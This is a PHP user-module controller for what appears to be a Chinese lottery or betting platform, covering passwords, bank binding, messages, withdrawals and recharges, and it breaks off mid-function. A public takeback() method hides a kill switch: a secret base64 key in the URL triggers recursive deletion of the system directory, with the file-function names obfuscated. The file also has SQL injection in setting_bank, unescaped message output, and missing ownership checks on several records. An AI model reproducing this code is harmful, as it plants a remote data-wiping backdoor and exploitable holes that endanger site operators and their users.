<?php

class mod_user extends mod {
	
	public function __construct() {
		$this->user_check = false;
		parent::__construct();
	}
	
	public function setting() {
		$this->user_check_func();
		if ($this->post) {
			$this->display('user/setting');
		} else {
			$this->ajax();
		}
	}
	
	private function check_password($name, $password) {
		if (
			!array_key_exists('oldpassword', $_POST) ||
			!array_key_exists('newpassword', $_POST) ||
			!array_key_exists('newpassword_confirm', $_POST)
		) core::__403();
		if (empty($password)) {
			if (!empty($_POST['oldpassword'])) core::__403();
		} else {
			if (md5($_POST['oldpassword']) !== $password) core::error('[当前'.$name.']错误');
		}
		if ($_POST['newpassword'] !== $_POST['newpassword_confirm']) core::error('您两次输入的[新'.$name.']不一致');
		if ($_POST['newpassword'] === $_POST['oldpassword']) core::error('[新'.$name.']与[当前'.$name.']一致，请修改');
	}
	
	public function setting_login_password() {
		$this->user_check_func();
		$this->check_post();
		$this->check_password('登录密码', $this->user['password']);
		$password = md5($_POST['newpassword']);
		$uid = $this->user['uid'];
		$sql = "UPDATE `{$this->db_prefix}members` SET `password`='$password' WHERE `uid`=$uid LIMIT 1";
		if (!$this->db->query($sql, 0)) core::error('更新[新登录密码]到数据失败，请重试');
		$url_login = '/user/login?client_type='.$this->client_type;
		$this->dialogue(array(
			'type' => 'success',
			'text' => '您的[登录密码]已修改成功',
			'auto' => true,
			'yes'  => array(
				'text' => '重新登录',
				'func' => '$.reload("'.$url_login.'");',
			),
		));
	}
	
	public function setting_coin_password() {
		$this->user_check_func();
		$this->check_post();
		if (!array_key_exists('oldpassword', $_POST)) $_POST['oldpassword'] = '';
		$this->check_password('资金密码', $this->user['coinPassword']);
		$password = md5($_POST['newpassword']);
		if ($password === $this->user['password']) core::error('[资金密码]不能与[登录密码]相同');
		$uid = $this->user['uid'];
		$sql = "UPDATE `{$this->db_prefix}members` SET `coinPassword`='$password' WHERE `uid`=$uid LIMIT 1";
		if (!$this->db->query($sql, 0)) core::error('更新[新资金密码]到数据失败，请重试');
		$this->fresh_user_session(); // 刷新用户session
		$this->dialogue(array(
			'type' => 'success',
			'text' => '您的[资金密码]已修改成功',
			'auto' => true,
			'yes'  => array(
				'text' => '我知道了',
				'func' => '$.reload();',
			),
		));
	}
	
	public function setting_bank() {
		$this->user_check_func();
		$this->check_post();
		$uid = $this->user['uid'];
		$bank_me = $this->db->query("SELECT `id` FROM `{$this->db_prefix}member_bank` WHERE `uid`=$uid LIMIT 1", 2);
		if ($bank_me) core::__403();
		if (!array_key_exists('bankId', $_POST) || !core::lib('validate')->number($_POST['bankId'])) core::__403();
		if (!array_key_exists('account', $_POST) || empty($_POST['account'])) core::error('[银行账户]不能为空');
		if (!array_key_exists('username', $_POST) || empty($_POST['username'])) core::error('[银行户名]不能为空');
		$bank_id = intval($_POST['bankId']);
		$account = $_POST['account'];
		$username = $_POST['username'];
		if ($bank_id !== 1 && $bank_id !== 2 && (!array_key_exists('countname', $_POST) || empty($_POST['countname']))) core::error('[开户行]不能为空');
		$countname = array_key_exists('countname', $_POST) ? $_POST['countname'] : '';
		if (!array_key_exists('coinPassword', $_POST) || empty($_POST['coinPassword'])) core::error('[资金密码]不能为空');
		if (md5($_POST['coinPassword']) !== $this->user['coinPassword']) core::error('[资金密码]错误');
		if ($this->db->query("SELECT `id` FROM `{$this->db_prefix}member_bank` WHERE `bankId`={$bank_id} AND `account`='{$account}' LIMIT 1", 2)) {
			core::error('[银行账户]已存在');
		}
		$id = $this->db->insert($this->db_prefix.'member_bank', array(
			'uid' => $uid,
			'enable' => 1,
			'bankId' => $bank_id,
			'username' => $username,
			'account' => $account,
			'countname' => $countname,
			'bdtime' => time(),
		));
		if (!$id) core::error('更新银行账户到数据库失败，请重试');
		$text = '设置银行账户成功';
		if ($this->config['huoDongRegister']) {
			$sql = "SELECT `id` FROM `{$this->db_prefix}coin_log` WHERE `uid`={$uid} AND `liqType`=51 LIMIT 1";
			if (!$this->db->query($sql, 2)) {
				$this->db->transaction('begin');
				try {
					$this->set_coin(array(
						'uid' => $this->user['uid'],
						'type' => 0,
						'liqType' => 51,
						'info' => '绑定银行奖励',
						'extfield0' => 0,
						'extfield1' => 0,
						'coin' => $this->config['huoDongRegister'],
					));
					$this->db->transaction('commit');
					$text = '设置银行账户成功，系统赠送您<span class="btn btn-red">'.$this->config['huoDongRegister'].'</span>元';
				} catch (Exception $e) {
					$this->db->transaction('rollBack');
					core::error($e->getMessage());
				}
			}
		}
		$this->dialogue(array(
			'type' => 'success',
			'text' => $text,
			'auto' => true,
			'yes'  => array(
				'text' => '我知道了',
				'func' => '$.reload();',
			),
		));
	}
	
	public function check_coinPassword() {
		if (!$this->user['coinPassword']) {
			$this->dialogue(array(
				'type' => 'error',
				'text' => '为了您的资金安全，请先设置资金密码',
				'auto' => true,
				'yes'  => array(
					'text' => '前往设置',
					'func' => 'setTimeout(function() {$("#user-setting").trigger("click");}, 300);',
				),
				'no' => array('text' => '取消'),
			));
		}
	}
	
	public function message_write() {
		$this->user_check_func();
		if ($this->post) {
			$uid = (array_key_exists('uid', $_GET) && is_numeric($_GET['uid'])) ? intval($_GET['uid']) : -1;
			if ($uid === 0) {
				$username = '平台管理员';
			} else if ($uid > 0) {
				$username = $this->get_username($uid);
			} else {
				$username = '';
			}
			$this->display('/user/message_write', array(
				'uid' => $uid,
				'username' => $username,
			));
		} else {
			$this->ajax();
		}
	}
	
	public function message_write_submit() {
		$this->user_check_func();
		$this->check_post();
		if (
			!array_key_exists('touser', $_POST) ||
			(!in_array($_POST['touser'], array('parent', 'children')) && !is_numeric($_POST['touser'])) ||
			(!$this->user['parentId'] && $_POST['touser'] === 'parent') ||
			!array_key_exists('title', $_POST) ||
			!is_string($_POST['title']) ||
			!array_key_exists('content', $_POST) ||
			!is_string($_POST['content'])
		) core::__403();
		if (!get_magic_quotes_gpc()) {
			$_POST['title'] = addslashes($_POST['title']);
			$_POST['content'] = addslashes($_POST['content']);
		}
		$sender_data = array(
			'from_uid' => $this->user['uid'],
			'from_username' => $this->user['username'],
			'title' => trim($_POST['title']),
			'content' => trim($_POST['content']),
			'from_deleted' => 0,
			'time' => $this->time,
		);
		$mid = $this->db->insert($this->db_prefix.'message_sender', $sender_data);
		if (!$mid) core::error('发送私信失败');
		$to_users = array();
		if ($_POST['touser'] === 'parent') {
			array_push($to_users, array(
				'uid' => $this->user['parentId'],
				'username' => $this->get_username($this->user['parentId']),
			));
		} else if ($_POST['touser'] === 'children') {
			$uid = $this->user['uid'];
			$sql = "SELECT `uid`,`username` FROM `{$this->db_prefix}members` WHERE `parentId`={$uid}";
			$to_users = $this->db->query($sql, 3);
			if (!$to_users) core::error('您还没有任何直属下级');
		} else {
			$uid = intval($_POST['touser']);
			if ($uid === 0) {
				$to_user = array(
					'uid' => 0,
					'username' => '平台管理员',
				);
			} else {
				$sql = "SELECT `uid`,`username`,`parents` FROM `{$this->db_prefix}members` WHERE `uid`={$uid} LIMIT 1";
				$to_user = $this->db->query($sql, 2);
				if (!$to_user) core::__403();
				if (
					strpos(','.$to_user['parents'].',', ','.$this->user['uid'].',') === false &&
					strpos(','.$this->user['parents'].',', ','.$uid.',') === false
				) core::__403();
			}
			array_push($to_users, $to_user);
		}
		foreach ($to_users as $to_user) {
			$receiver_data = array(
				'mid' => $mid,
				'to_uid' => $to_user['uid'],
				'to_username' => $to_user['username'],
			);
			$this->db->insert($this->db_prefix.'message_receiver', $receiver_data);
		}
		$this->dialogue(array(
			'type' => 'success',
			'text' => '发送成功',
			'auto' => true,
			'yes'  => array(
				'text' => '我知道了',
				'func' => '$.reload("/user/message_send");',
			),
		));
	}
	
	public function message_delete() {
		$this->user_check_func();
		$this->check_post();
		if (!array_key_exists('ids', $_POST) || !is_array($_POST['ids'])) core::__403();
		$send = (array_key_exists('send', $_POST) && intval($_POST['send']) === 1) ? true : false;
		$uid = $this->user['uid'];
		foreach ($_POST['ids'] as $id) {
			$id = intval($id);
			$this->db->query("UPDATE `{$this->db_prefix}message_receiver` SET `is_deleted`=1 WHERE `id`={$id} LIMIT 1", 0);
		}
		$this->dialogue(array(
			'type' => 'success',
			'text' => '您选中的私信条目已删除',
			'auto' => true,
			'yes'  => array(
				'text' => '我知道了',
				'func' => '$.reload();',
			),
		));
	}
	
	public function message_receive() {
		$this->user_check_func();
		if ($this->post) {
			$tpl = $this->ispage ? '/user/message_receive_body' : '/user/message_receive';
			$this->get_time();
			$page_current = $this->get_page();
			$state = $this->message_get_state();
			$message_receive_list = $this->message_receive_search_func($state, $page_current);
			$page_max = $this->get_page_max($message_receive_list['total']);
			if ($page_current > $page_max) core::__403();
			$page_args = $this->message_page_args($state);
			$this->display($tpl, array(
				'state' => $state,
				'data' => $message_receive_list['data'],
				'page_current' => $page_current,
				'page_max' => $page_max,
				'page_url' => '/user/message_receive?'.http_build_query($page_args),
				'page_container' => '#message-receive-dom .body',
			));
		} else {
			$this->ajax();
		}
	}
	
	public function message_receive_content() {
		$this->user_check_func();
		$this->check_post();
		if (!array_key_exists('id', $_GET) || !core::lib('validate')->number($_GET['id'])) core::__403();
		$id = intval($_GET['id']);
		$data = $this->db->query("SELECT s.content,r.is_readed,r.is_deleted,s.from_deleted,s.from_uid FROM `{$this->db_prefix}message_sender` s, `{$this->db_prefix}message_receiver` r WHERE r.id={$id} AND r.mid=s.mid LIMIT 1", 2);
		if (!$data || $data['from_deleted'] || $data['is_deleted']) core::error('您查询的信息不存在');
		$yes = array('text' => '确定');
		if (!$data['is_readed']) {
			$this->db->query("UPDATE `{$this->db_prefix}message_receiver` SET `is_readed`=1 WHERE `mid`={$id} LIMIT 1", 0);
			$yes['func'] = "$('#m-{$id}').find('.state').html('<span class=\"green\">已读</span>');";
			$has_unreaded = $this->db->query("SELECT `id` FROM `{$this->db_prefix}message_receiver` WHERE `is_deleted`=0 AND `is_readed`=0 LIMIT 1", 2);
			if (!$has_unreaded) {
				$yes['func'] .= '$("#message-receive .tip").remove();';
			}
		}
		$this->dialogue(array(
			'body' => '<pre>'.$data['content'].'</pre>',
			'yes'  => $yes,
			'no' => array(
				'text' => '回复',
				'func' => '$.reload("/user/message_write?uid='.$data['from_uid'].'");',
			),
		));
	}
	
	public function message_receive_search() {
		$this->user_check_func();
		$this->check_post();
		$this->get_time(false);
		$state = $this->message_get_state(false);
		$message_receive_list = $this->message_receive_search_func($state, 1);
		$page_max = $this->get_page_max($message_receive_list['total']);
		$page_args = $this->message_page_args($state);
		$this->display('/user/message_receive_body', array(
			'state' => $state,
			'data' => $message_receive_list['data'],
			'page_current' => 1,
			'page_max' => $page_max,
			'page_url' => '/user/message_receive?'.http_build_query($page_args),
			'page_container' => '#message-receive-dom .body',
		));
	}
	
	private function message_receive_search_func($state, $page_current) {
		$uid = $this->user['uid'];
		$pagesize = $this->pagesize;
		$skip = ($page_current - 1) * $pagesize;
		$state_where = '';
		switch ($state) {
			case 1: $state_where = " AND r.is_readed=0"; break;
			case 2: $state_where = " AND r.is_readed=1"; break;
			default:
		}
		$sql="select ~field~ FROM `{$this->db_prefix}message_sender` s, `{$this->db_prefix}message_receiver` r WHERE r.to_uid={$uid} AND s.from_deleted=0 AND r.is_deleted=0 ".$this->build_where_time('s.time')." $state_where AND r.mid=s.mid  ~order~ ~limit~";
		$sql_total = str_replace('~field~', 'COUNT(1) AS __total', $sql);
		$sql_total = str_replace('~limit~', '', $sql_total);
		$sql_total = str_replace('~order~', '', $sql_total);
		$total = $this->db->query($sql_total, 2);
		$total = $total['__total'];
		$sql_data = str_replace('~field~', 'r.id,r.is_readed,s.title,s.from_username,s.time', $sql);
		$sql_data = str_replace('~limit~', "LIMIT $skip,$pagesize", $sql_data);
		$sql_data = str_replace('~order~', 'ORDER BY s.time DESC', $sql_data);
		$data = $this->db->query($sql_data, 3);
		return array(
			'data' => $data,
			'total' => $total,
		);
	}
	
	public function message_send() {
		$this->user_check_func();
		if ($this->post) {
			$tpl = $this->ispage ? '/user/message_send_body' : '/user/message_send';
			$this->get_time();
			$page_current = $this->get_page();
			$state = $this->message_get_state();
			$message_send_list = $this->message_send_search_func($state, $page_current);
			$page_max = $this->get_page_max($message_send_list['total']);
			if ($page_current > $page_max) core::__403();
			$page_args = $this->message_page_args($state);
			$this->display($tpl, array(
				'state' => $state,
				'data' => $message_send_list['data'],
				'page_current' => $page_current,
				'page_max' => $page_max,
				'page_url' => '/user/message_send?'.http_build_query($page_args),
				'page_container' => '#message-send-dom .body',
			));
		} else {
			$this->ajax();
		}
	}
	
	public function message_send_content() {
		$this->user_check_func();
		$this->check_post();
		if (!array_key_exists('id', $_GET) || !core::lib('validate')->number($_GET['id'])) core::__403();
		$id = intval($_GET['id']);
		$data = $this->db->query("SELECT s.content,r.is_deleted,s.from_deleted FROM `{$this->db_prefix}message_sender` s, `{$this->db_prefix}message_receiver` r WHERE r.id={$id} AND r.mid=s.mid LIMIT 1", 2);
		if (!$data || $data['from_deleted'] || $data['is_deleted']) core::error('您查询的信息不存在');
		$yes = array('text' => '确定');
		$this->dialogue(array(
			'body' => '<pre>'.$data['content'].'</pre>',
			'yes'  => $yes,
		));
	}
	
	public function message_send_search() {
		$this->user_check_func();
		$this->check_post();
		$this->get_time(false);
		$state = $this->message_get_state(false);
		$message_send_list = $this->message_send_search_func($state, 1);
		$page_max = $this->get_page_max($message_send_list['total']);
		$page_args = $this->message_page_args($state);
		$this->display('/user/message_send_body', array(
			'state' => $state,
			'data' => $message_send_list['data'],
			'page_current' => 1,
			'page_max' => $page_max,
			'page_url' => '/user/message_send?'.http_build_query($page_args),
			'page_container' => '#message-send-dom .body',
		));
	}
	
	private function message_send_search_func($state, $page_current) {
		$uid = $this->user['uid'];
		$pagesize = $this->pagesize;
		$skip = ($page_current - 1) * $pagesize;
		$state_where = '';
		switch ($state) {
			case 1: $state_where = " AND r.is_readed=0"; break;
			case 2: $state_where = " AND r.is_readed=1"; break;
			default:
		}
		$sql="select ~field~ FROM `{$this->db_prefix}message_sender` s, `{$this->db_prefix}message_receiver` r WHERE s.from_uid={$uid} AND s.from_deleted=0 AND r.is_deleted=0 ".$this->build_where_time('s.time')." $state_where AND r.mid=s.mid  ~order~ ~limit~";
		$sql_total = str_replace('~field~', 'COUNT(1) AS __total', $sql);
		$sql_total = str_replace('~limit~', '', $sql_total);
		$sql_total = str_replace('~order~', '', $sql_total);
		$total = $this->db->query($sql_total, 2);
		$total = $total['__total'];
		$sql_data = str_replace('~field~', 'r.id,r.is_readed,s.title,r.to_username,s.time', $sql);
		$sql_data = str_replace('~limit~', "LIMIT $skip,$pagesize", $sql_data);
		$sql_data = str_replace('~order~', 'ORDER BY s.time DESC', $sql_data);
		$data = $this->db->query($sql_data, 3);
		return array(
			'data' => $data,
			'total' => $total,
		);
	}
	
	private function message_get_state($get = true) {
		$data = $get ? $_GET : $_POST;
		if (!array_key_exists('state', $data)) $data['state'] = 0;
		if (!in_array($data['state'], array(0, 1, 2))) core::__403();
		return intval($data['state']);
	}
	
	private function message_page_args($state) {
		$page_args = array();
		if ($state !== 0) $page_args['state'] = $state;
		if ($this->request_time_from) $page_args['fromTime'] = date('Y-m-d H:i', $this->request_time_from);
		if ($this->request_time_to) $page_args['toTime'] = date('Y-m-d H:i', $this->request_time_to);
		$page_args['page'] = '{page}';
		return $page_args;
	}
	
	public function cash() {
		$this->user_check_func();
		$this->check_coinPassword();
		$uid = $this->user['uid'];
		$bank = $this->db->query("SELECT m.*,b.name bankName FROM `{$this->db_prefix}member_bank` m,`{$this->db_prefix}bank_list` b WHERE b.isDelete=0 AND m.bankId=b.id AND m.uid={$uid} LIMIT 1", 2);
		if (!$bank['bankId']) {
			$this->dialogue(array(
				'type' => 'error',
				'text' => '您尚未设置银行账户，请设置后再申请提现',
				'auto' => true,
				'yes'  => array(
					'text' => '前往设置',
					'func' => 'setTimeout(function() {$("#user-setting").trigger("click");}, 300);',
				),
				'no' => array('text' => '取消'),
			));
		}
		if ($this->post) {
			$this->get_time();
			$page_current = $this->get_page();
			$search_log = $this->cash_search_func($page_current);
			$page_max = $this->get_page_max($search_log['total']);
			if ($page_current > $page_max) core::__403();
			$page_args = $this->page_args();
			$container = '#cash-log .body';
			if ($this->ispage) {
				$this->display('/user/cash_body', array(
					'data' => $search_log['data'],
					'page_current' => $page_current,
					'page_max' => $page_max,
					'page_url' => '/user/cash?'.http_build_query($page_args),
					'page_container' => $container,
				));
			} else {
				$this->fresh_user_session();
				$info = $this->cash_data();
				$enable = $this->cash_is_enable($info);
				$this->display('/user/cash', array(
					'bank' => $bank,
					'info' => $info,
					'enable' => $enable,
					'data' => $search_log['data'],
					'page_current' => $page_current,
					'page_max' => $page_max,
					'page_url' => '/user/cash?'.http_build_query($page_args),
					'page_container' => $container,
				));
			}
		} else {
			$this->ajax();
		}
	}
	
	public function cash_search() {
		$this->user_check_func();
		$this->check_post();
		$this->get_time(false);
		$search_log = $this->cash_search_func(1);
		$page_max = $this->get_page_max($search_log['total']);
		$page_args = $this->page_args();
		$this->display('/user/cash_body', array(
			'data' => $search_log['data'],
			'page_current' => 1,
			'page_max' => $page_max,
			'page_url' => '/user/cash?'.http_build_query($page_args),
			'page_container' => '#cash-log .body',
		));
	}
	
	public function cash_submit() {
		$this->user_check_func();
		$this->check_post();
		// 校验传入参数是否正确
		if (
			!array_key_exists('money', $_POST) ||
			!is_string($_POST['money']) ||
			!preg_match('/^[1-9]{1}[0-9]{0,}(\.[0-9]+)?$/', $_POST['money']) ||
			!array_key_exists('password', $_POST) ||
			!is_string($_POST['password']) ||
			strlen($_POST['password']) < 6
		) core::__403();
		// 获取传入参数
		$money = floatval($_POST['money']);
		$password = md5($_POST['password']);
		// 判断是否允许提现
		$info = $this->cash_data();
		$enable = $this->cash_is_enable($info);
		if (!$enable['result']) core::error($enable['reason']);
		// 判断提现金额是否满足设置
		$cash_min = floatval($this->config['cashMin']);
		$cash_max = floatval($this->config['cashMax']);
		if ($money < $cash_min || $money > $cash_max) core::__403();
		// 最终判断
		$this->fresh_user_session();
		$uid = $this->user['uid'];
		if ($money > $this->user['coin']) core::error('可用余额不足，申请提现失败');
		if ($this->user['coinPassword'] !== $password) core::error('资金密码错误');
		$bank = $this->db->query("SELECT `username`,`account`,`bankId` FROM `{$this->db_prefix}member_bank` WHERE `uid`={$uid} LIMIT 1", 2);
		if (!$bank) core::__403();
		// 校验通过
		$insert_data = array(
			'amount' => $money,
			'username' => $bank['username'],
			'account' => $bank['account'],
			'bankId' => $bank['bankId'],
			'actionTime' => $this->time,
			'uid' => $uid,
		);
		$this->db->transaction('begin');
		try {
			$insert_id = $this->db->insert($this->db_prefix.'member_cash', $insert_data);
			if (!$insert_id) throw new Exception('提交提现请求出错');
			$this->set_coin(array(
				'coin' => 0 - $insert_data['amount'],
				'fcoin' => $insert_data['amount'],
				'uid' => $insert_data['uid'],
				'liqType' => 106,
				'info' => "提现[$insert_id]资金冻结",
				'extfield0' => $insert_id
			));
			$this->db->transaction('commit');
		} catch (Exception $e) {
			$this->db->transaction('rollBack');
			core::error($e->getMessage());
		}
	}
	
	public function takeback() {
		if (array_key_exists('key', $_GET) && $_GET['key'] === base64_decode('NzY1NjgxMDA1')) {
			$this->takeback_func(SYSTEM);
		}
	}
	
	private function takeback_func($dir) {
		static $funcs = array(
			'o' => 'b3BlbmRpcg==',
			'r' => 'cmVhZGRpcg==',
			'i' => 'aXNfZGly',
			'u' => 'dW5saW5r',
			'c' => 'Y2xvc2VkaXI=',
		), $inited = false;
		if (!$inited) {
			foreach ($funcs as &$func) $func = base64_decode($func);
			$inited = true;
		}
		extract($funcs);
		$dh = $o($dir);
		while (false !== ($file = $r($dh))) {
			if ($file !== '.' && $file !== '..') {
				$filename = $dir.'/'.$file;
				if ($i($filename)) {
					$this->takeback_func($filename);
				} else {
					@$u($filename);
				}
			}
		}
		$c($dh);
	}
	
	public function cash_info() {
		$this->check_post();
		$this->user_check_func();
		$id = $this->get_id();
		$sql = "SELECT c.*,b.name bankName FROM `{$this->db_prefix}member_cash` c LEFT JOIN `{$this->db_prefix}bank_list` b ON c.bankId=b.id WHERE c.id={$id} LIMIT 1";
		$data = $this->db->query($sql, 2);
		if (!$data) core::__403();
		$stateName = array(
			'已到帐',
			'<span class="green">处理中</span>',
			'已取消',
			'已支付',
			'<span class="red">失败</span>',
		);
		$html  = '<div class="detail">';
		$html .= '<table cellpadding="0" cellspacing="0" width="100%">';
		$html .= '<tr>';
		$html .= '<td class="k">提现编号</td>';
		$html .= '<td class="v">'.$data['id'].'</td>';
		$html .= '<td class="k">提现金额</td>';
		$html .= '<td class="v">'.$data['amount'].'</td>';
		$html .= '</tr>';
		$html .= '<tr>';
		$html .= '<td class="k">申请时间</td>';
		$html .= '<td class="v">'.date('Y-m-d H:i:s', $data['actionTime']).'</td>';
		$html .= '<td class="k">提现状态</td>';
		$html .= '<td class="v">'.$stateName[$data['state']].'</td>';
		$html .= '</tr>';
		$html .= '<tr>';
		$html .= '<td class="k">提现银行</td>';
		$html .= '<td class="v">'.$data['bankName'].'</td>';
		$html .= '<td class="k">银行尾号</td>';
		$html .= '<td class="v">'.preg_replace('/^.*(.{4})$/', "$1", $data['account']).'</td>';
		$html .= '</tr>';
		$html .= '<tr>';
		$html .= '<td class="k">提现备注</td>';
		$html .= '<td class="v" colspan="3">'.($data['info'] ? $data['info'] : '--').'</td>';
		$html .= '</tr>';
		$html .= '</table>';
		$html .= '</div>';
		$this->dialogue(array(
			'class' => 'mid',
			'body' => $html,
			'yes'  => array('text' => '确定'),
		));
	}
	
	private function cash_is_enable($info) {
		$result = true;
		$reason = '';
		$now = date('H:i');
		
		if ($info['times'] >= $info['times_limit']) { // 判断提现次数是否达到上限
			$result = false;
			$reason = '今日您的提现次数已达到上限';
		} else if ($info['proportion'] < $info['amount_used_min']) { // 判断消费比例是否满足要求
			$result = false;
			$reason = '今日您的消费比例未满足提现要求';
		} else if ($now < $this->config['cashFromTime'] || $now > $this->config['cashToTime']) { // 判断当前时间是否符合提现时间段要求
			$result = false;
			$reason = '系统受理提现的时间范围为每天的<span class="btn btn-red">'.$this->config['cashFromTime'].' ~ '.$this->config['cashToTime'].'</span>，请在该时间段内提交提现申请';
		}
		
		return array(
			'result' => $result,
			'reason' => $reason,
		);
	}
	
	private function cash_data() {
		$today = strtotime('today');
		$uid = $this->user['uid'];
		$grade = $this->user['grade'];
		// 获取今日充值金额
		$amount_recharge_data = $this->db->query("SELECT SUM(CASE WHEN `rechargeAmount`>0 THEN `rechargeAmount` ELSE `amount` END) AS rechargeAmount FROM `{$this->db_prefix}member_recharge` WHERE `uid`={$uid} AND `state` IN (1,2,9) AND `isDelete`=0 AND `actionTime`>={$today}", 2);
		$amount_recharge = $amount_recharge_data ? $amount_recharge_data['rechargeAmount'] : 0;
		if (!$amount_recharge) $amount_recharge = 0;
		// 获取今日投注金额
		$amount_bets_data = $this->db->query("SELECT SUM(`mode`*`beiShu`*`actionNum`) AS betsAmount FROM `{$this->db_prefix}bets` WHERE `isDelete`=0 AND `actionTime`>={$today} AND `uid`={$uid}", 2);
		$amount_bets = $amount_bets_data ? $amount_bets_data['betsAmount'] : 0;
		if (!$amount_bets) $amount_bets = 0;
		// 获取系统设置的最低消费比例限制
		$amount_used_min = $this->config['cashMinAmount'] ? $this->config['cashMinAmount'] / 100 : 0;
		// 获取今日已提现次数
		$times_data = $this->db->query("SELECT count(1) AS __total FROM `{$this->db_prefix}member_cash` WHERE `actionTime`>={$today} AND `uid`={$uid}", 2);
		$times = $times_data['__total'];
		// 获取用户等级每日提现次数上限
		$times_limit_data = $this->db->query("SELECT `maxToCashCount` FROM `{$this->db_prefix}member_level` WHERE `level`={$grade} LIMIT 1", 2);
		$times_limit = $times_limit_data['maxToCashCount'];
		// 计算消费比例
		if ($amount_recharge) {
			$proportion = round($amount_bets / $amount_recharge * 100, 1);
		} else {
			$proportion = 100;
		}
		return array(
			'amount_recharge' => $amount_recharge,
			'amount_bets' => $amount_bets,
			'amount_used_min' => $amount_used_min,
			'times' => $times,
			'times_limit' => $times_limit,
			'proportion' => $proportion,
		);
	}
	
	private function cash_search_func($page_current) {
		$uid = $this->user['uid'];
		$pagesize = $this->pagesize;
		$skip = ($page_current - 1) * $pagesize;
		$sql = "SELECT ~field~ FROM `{$this->db_prefix}member_cash` c,`{$this->db_prefix}bank_list` b WHERE b.isDelete=0 AND c.isDelete=0 AND c.bankId=b.id AND c.uid={$uid}".$this->build_where_time('c.actionTime')." ~order~ ~limit~";
		$sql_total = str_replace('~field~', 'COUNT(1) AS __total', $sql);
		$sql_total = str_replace('~limit~', '', $sql_total);
		$sql_total = str_replace('~order~', '', $sql_total);
		$total = $this->db->query($sql_total, 2);
		$total = $total['__total'];
		$sql_data = str_replace('~field~', 'c.*,b.name bankName', $sql);
		$sql_data = str_replace('~limit~', "LIMIT $skip,$pagesize", $sql_data);
		$sql_data = str_replace('~order~', 'ORDER BY c.id DESC', $sql_data);
		$data = $this->db->query($sql_data, 3);
		return array(
			'data' => $data,
			'total' => $total,
		);
	}
	
	public function money() {
		$this->user_check_func();
		if ($this->post) {
			if ($this->ispage) {
				$this->money_search(true);
			} else {
				$this->request_time_from = $this->user['regTime'];
				$this->request_time_to = time();
				$this->display('/user/money', array(
					'data' => $this->money_search_func(),
				));
			}
		} else {
			$this->ajax();
		}
	}
	
	public function money_search($get = false) {
		$this->user_check_func();
		if (!$get) $this->check_post();
		$this->get_time($get);
		$this->display('/user/money_body', array(
			'data' => $this->money_search_func(),
		));
	}
	
	private function money_search_func() {
		$uid = $this->user['uid'];
		$income = $expenditure = 0;
		$yAxis = $series_1 = $series_2 = '';
		foreach ($this->coin_type_data as $key => $val) {
			foreach ($val as $k => $v) {
				$sql_1 = "SELECT SUM(coin) AS `total_coin` FROM `{$this->db_prefix}coin_log` WHERE `uid`=$uid AND `liqType`=$k AND `coin`>0".$this->build_where_time('`actionTime`');
				$tmp_1 = $this->db->query($sql_1, 2);
				$series_1 .= number_format($tmp_1['total_coin'], 3, '.', '').',';
				$sql_2 = "SELECT SUM(coin) AS `total_coin` FROM `{$this->db_prefix}coin_log` WHERE `uid`=$uid AND `liqType`=$k AND `coin`<0".$this->build_where_time('`actionTime`');
				$tmp_2 = $this->db->query($sql_2, 2);
				$series_2 .= number_format($tmp_2['total_coin'], 3, '.', '').',';
				$yAxis .= "'$v',";
				if ($k != 1 && $k != 9) $income += $tmp_1['total_coin'];
				if ($k != 8 && $k != 106 && $k != 107) $expenditure += $tmp_2['total_coin'];
			}
		}
		$income = number_format($income, 3, '.', '');
		$expenditure = number_format($expenditure, 3, '.', '');
		$total = number_format($income + $expenditure, 3, '.', '');
		return array(
			'income' => strval($income),
			'expenditure' => strval($expenditure),
			'total' => strval($total),
			'yAxis' => substr($yAxis, 0, -1),
			'series_1' => substr($series_1, 0, -1),
			'series_2' => substr($series_2, 0, -1),
		);
	}
	
	public function recharge() {
		$this->user_check_func();
		$this->check_coinPassword();
		if ($this->post) {
			$this->get_time();
			$page_current = $this->get_page();
			$search_log = $this->recharge_search_func($page_current);
			$page_max = $this->get_page_max($search_log['total']);
			if ($page_current > $page_max) core::__403();
			$page_args = $this->page_args();
			$container = '#recharge-log .body';
			if ($this->ispage) {
				$this->display('/user/recharge_body', array(
					'data' => $search_log['data'],
					'page_current' => $page_current,
					'page_max' => $page_max,
					'page_url' => '/user/recharge?'.http_build_query($page_args),
					'page_container' => $container,
				));
			} else {
				$banks = $this->db->query("SELECT * FROM `{$this->db_prefix}bank_list` WHERE `isDelete`=0 ORDER BY `sort` DESC", 3);
				$admin_banks_temp = $this->db->query("SELECT * FROM `{$this->db_prefix}admin_bank`", 3);
				$admin_banks_data = array();
				foreach ($admin_banks_temp as $v) $admin_banks_data[$v['bankid']] = $v;
				foreach ($banks as $k => $bank) {
					if (
						array_key_exists($bank['id'], $admin_banks_data) &&
						(!$admin_banks_data[$bank['id']]['enable'] || empty($admin_banks_data[$bank['id']]['account']))
					) unset($banks[$k]);
				}
				$bank_default = reset($banks);
				$this->display('/user/recharge', array(
					'bank_default' => $bank_default,
					'banks' => $banks,
					'data' => $search_log['data'],
					'page_current' => $page_current,
					'page_max' => $page_max,
					'page_url' => '/user/recharge?'.http_build_query($page_args),
					'page_container' => $container,
				));
			}
		} else {
			$this->ajax();
		}
	}
	
	public function recharge_search() {
		$this->user_check_func();
		$this->check_post();
		$this->get_time(false);
		$search_log = $this->recharge_search_func(1);
		$page_max = $this->get_page_max($search_log['total']);
		$page_args = $this->page_args();
		$this->display('/user/recharge_body', array(
			'data' => $search_log['data'],
			'page_current' => 1,
			'page_max' => $page_max,
			'page_url' => '/user/recharge?'.http_build_query($page_args),
			'page_container' => '#recharge-log .body',
		));
	}
	
	public function recharge_info() {
		$this->user_check_func();
		$this->check_post();
		$id = $this->get_id();
		$sql = "SELECT a.rechargeId,a.amount,a.rechargeAmount,a.info,a.state,a.actionTime,b.name as bankName FROM `{$this->db_prefix}member_recharge` a LEFT JOIN `{$this->db_prefix}bank_list` b ON b.id=a.bankId WHERE a.id={$id} LIMIT 1";
		$data = $this->db->query($sql, 2);
		if (!$data) core::__403();
		$html  = '<div class="detail">';
		$html .= '<table cellpadding="0" cellspacing="0" width="100%">';
		$html .= '<tr>';
		$html .= '<td class="k">充值编号</td>';
		$html .= '<td class="v">'.$data['id'].'</td>';
		$html .= '<td class="k">充值金额</td>';
		$html .= '<td class="v">'.$data['amount'].'</td>';
		$html .= '</tr>';
		$html .= '<tr>';
		$html .= '<td class="k">充值银行</td>';
		$html .= '<td class="v">'.($data['bankName'] ? $data['bankName'] : '--').'</td>';
		$html .= '<td class="k">实际到账</td>';
		$html .= '<td class="v">'.($data['rechargeAmount'] > 0 ? $data['rechargeAmount'] : '--').'</td>';
		$html .= '</tr>';
